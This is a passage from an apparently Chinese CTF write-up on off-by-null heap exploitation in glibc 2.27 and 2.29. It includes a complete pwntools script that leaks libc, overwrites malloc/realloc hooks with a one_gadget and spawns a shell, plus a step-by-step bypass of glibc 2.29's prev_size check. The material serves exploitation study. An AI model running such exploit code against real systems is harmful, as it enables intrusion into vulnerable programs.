+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#A</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1">#B</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span> <span class="c1">#C</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png"
+        data-srcset="https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png, https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png 1.5x, https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/21fJQHeuDh4OFkp.png"
+        title="image-20200710222930514" /></p>
+<p>现在让我们来释放A堆块，并用B堆块修改C堆块的大小。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png"
+        data-srcset="https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png, https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png 1.5x, https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/icVR317DIUMoLk2.png"
+        title="image-20200710222226781" /></p>
+<p>接下来我们释放C堆块，然后C堆块将会和AB堆块发生合并。（这里的检测机制和2.23一样我就不赘述了）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png"
+        data-srcset="https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png, https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png 1.5x, https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/aA7lFghpjXPLGKN.png"
+        title="image-20200710222949822" /></p>
+<p>OK成功合并，off by null漏洞利用成功，接下来的就是获取Shell了，思路和2.23一样。</p>
+<ul>
+<li>分配0x80大小堆块，将unsorted bin的地址放入B堆块中。（这里需要先将tcache中的堆块分配完）</li>
+<li>泄漏libc地址</li>
+<li>再分配0x20大小堆块，从而有两个B堆块</li>
+<li>释放其中一个修改fd为realloc_hook</li>
+<li>修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">s</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sea</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>          <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">info_addr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>        <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span><span class="s1">&#39;: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">gdba</span>	<span class="o">=</span> <span class="k">lambda</span> <span class="n">command</span><span class="o">=</span><span class="s1">&#39;&#39;</span>			<span class="p">:</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">full</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">full</span><span class="p">:</span>
+		<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/glibc/2.27/amd64/lib/libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1">#A</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1">#B</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span> <span class="c1">#C</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xb0</span><span class="p">),</span><span class="n">full</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3afca0</span>
+<span class="n">malloc_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+<span class="n">realloc</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;realloc&#39;</span><span class="p">]</span>
+<span class="n">gadget</span><span class="o">=</span><span class="p">[</span><span class="mh">0x41666</span><span class="p">,</span><span class="mh">0xdeed2</span><span class="p">]</span>
+<span class="n">onegadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">gadget</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s1">&#39;libc_base&#39;</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;malloc_hook&#34;</span><span class="p">,</span><span class="n">malloc_hook</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;onegadget&#34;</span><span class="p">,</span><span class="n">onegadget</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x8</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="libc229的利用">libc2.29的利用</h1>
+<p>在libc2.29中，对向前合并操作，增加了保护机制。究竟是什么保护呢，我们一起来看看libc2.29的源代码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c">    <span class="cm">/* consolidate backward */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">prevsize</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+      <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
+      <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prevsize</span><span class="p">))</span>
+        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted size vs. prev_size while consolidating&#34;</span><span class="p">);</span>
+      <span class="n">unlink_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>相对于2.27和2.23版本的libc，2.29版本增加了一条if判断。其会检测prev_size和p堆块的size是否相等。p堆块是什么堆块呢？是根据prevsize的值而计算出来的上一个堆块。用我们上面举的ABCD堆块的例子来说，这里的p堆块就是A堆块，而A堆块的size值是0x90，很明显和我们将要修改的prevsize值是不相等的，prevsize的值是A+B。所以如果按照2.23和2.27的做法来做的话，将不能绕过这个检验。</p>
+<p>那我们应该怎么做？我们之前绕过利用了unsorted bin留下的数据，同样2.29的off by null也是充分利用bin留下的数据来操控的。具体利用了large bin，small bin，fast bin。</p>
+<p>接下来，我们先总体看一看利用思路，再分析思路原理和一些细节。</p>
+<ol>
+<li>将heap的地址第二字节大小提高到0x00</li>
+<li>分配一个很大的chunk，这个chunk的大小要在largebin范围内并且大于tcache的最大值。（我们将这个chunk命名为A）</li>
+<li>释放A堆块，再分配一个大于A堆块大小的堆块，使A堆块进入large bin中。</li>
+<li>从A堆块中分割出一个堆块B，修改B堆块的bk和fd_size</li>
+<li>再从A堆块中分配两个相同大小且在fast bin大小范围内的C，D</li>
+<li>释放C，D，申请一个大于剩余A堆块大小的chunk，使C，D进入small bin中</li>
+<li>申请C堆块，构造bk</li>
+<li>申请D堆块，然后释放B，D堆块，将B，D放入fast bin中。</li>
+<li>申请B堆块修改fd。</li>
+<li>最后，从A堆块中分隔E，F，用E修改F的prev_size和prev_inuse位</li>
+<li>释放F堆块，完成向前合并（B，C，D，E）</li>
+</ol>
+<p>第一步中，为什么要将第二字节提高到0x00，我们先放到后面再来讲，我们先默认A堆块的地址第二个字节为0x00。</p>
+<p>第二步和第三步使A堆块放入了large bin中，我们知道large bin和其他堆块最大的区别在于多了一个size的双向链表，而当large bin中就这一个堆块时，fd_size和bk_size的值就是该堆块自己的地址。我们假设这里分配的A堆块是0x500。下图是A堆块释放到large bin中后，堆块中的数据。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png"
+        data-srcset="https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png, https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png 1.5x, https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/z8Qm1h3gsXLJI7W.png"
+        title="image-20200712215616559" /></p>
+<p>第四步，我们从A堆块中分隔B堆块，这里我们分隔0x30大小的堆块B，堆块B将会残留A堆块中的数据，所以其依然会保留上图中的fd，bk，fd_size，bk_size。这里我们需要将bk修改为我们堆块合并后的size，究竟是多少呢？我们现在还不知道，所以就暂时用consolidate_size代替。为了便于标记各个堆块，我们这里在size前面加上堆块的字母。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png"
+        data-srcset="https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png, https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png 1.5x, https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png"
+        title="https://i.loli.net/2020/07/13/l9NtyK3xfFUIcXD.png" /></p>
+<p>第五步，我们分配两个相同大小的chunkC，D，这里我们就分配0x30大小的chunk。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png"
+        data-srcset="https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png, https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png 1.5x, https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png"
+        title="https://i.loli.net/2020/07/13/wUReunSz7so8YIM.png" /></p>
+<p>第六步我们释放了C和D并申请一个大的堆块，使得C和D进入small bin中。注意这里先释放D再释放C，这样C堆块的bk将会是D堆块的地址，我们用addr of D来表示。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/zxRADHLUETGes87.png"
+        data-srcset="https://i.loli.net/2020/07/13/zxRADHLUETGes87.png, https://i.loli.net/2020/07/13/zxRADHLUETGes87.png 1.5x, https://i.loli.net/2020/07/13/zxRADHLUETGes87.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/zxRADHLUETGes87.png"
+        title="https://i.loli.net/2020/07/13/zxRADHLUETGes87.png" /></p>
+<p>由于D堆块的地址和B堆块的地址相近，因此在第七步中我们申请C堆块并将其bk的值修改为B堆块的地址加0x10。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png"
+        data-srcset="https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png, https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png 1.5x, https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png"
+        title="https://i.loli.net/2020/07/13/Qpmbu2oHzUh1iKg.png" /></p>
+<p>第八步中，我们释放B，D堆块，并将其放入fast bin中，此时B堆块的fd指向D堆块。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png"
+        data-srcset="https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png, https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png 1.5x, https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png"
+        title="https://i.loli.net/2020/07/13/a3U8p2zV1SMGIEc.png" /></p>
+<p>第九步中，我们将申请的B堆块的fd修改为B堆块+0x10，并且fd_size修改为C堆块的地址（这一步在第三步也可以完成）。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png"
+        data-srcset="https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png, https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png 1.5x, https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png"
+        title="https://i.loli.net/2020/07/13/OBNA4QxjadTKIVG.png" /></p>
+<p>现在我们已经构造出一个可以绕过unlink和新增的size检验的对堆块了。该堆块就是B+0x10，其size是我们可以修改的consolidate，若将其修改为prev_size的大小，那么我们就能绕过新增的检测，并且其fd和bk也能绕过unlink检验。我们画一画箭头就能更清晰的知道为什么能绕过unlink了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png"
+        data-srcset="https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png, https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png 1.5x, https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/13/D9MsYPdK8wHtvRI.png"
+        title="image-20200712222231789" /></p>
+<p>fd指向C堆块，而C堆块的bk刚好也是只想B+0x10的。</p>
+<p>bk是之前large bin留下来的值，其指向的是B堆块，而B堆块的fd同样是B+0x10。</p>
+<p>剩下的几个步骤就和2.23，2.29相似了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/13/oxrdOJ3a4zIUXCY.png"
